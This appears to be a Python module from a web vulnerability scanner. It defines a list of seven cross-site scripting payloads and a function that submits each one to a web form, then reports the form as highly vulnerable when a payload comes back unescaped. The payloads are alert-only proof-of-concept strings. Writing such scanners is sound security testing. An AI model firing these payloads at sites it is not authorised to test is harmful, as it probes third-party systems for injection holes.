from .utils import submit_form

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '\'"><img src=x onerror=alert(1)>',
    'javascript:alert("XSS")',
    '"><script>alert(1)</script>',
    '"><iframe src="javascript:alert(1)">'
]

def test_xss(url, form_details, session):
    """Test a form for XSS vulnerability"""
    vulnerabilities = []
    for payload in XSS_PAYLOADS:
        response = submit_form(form_details, url, payload, session)
        if payload in response.text:
            vulnerabilities.append({
                'type': 'XSS',
                'url': response.url,
                'payload': payload,
                'severity': 'High'
            })
    return vulnerabilities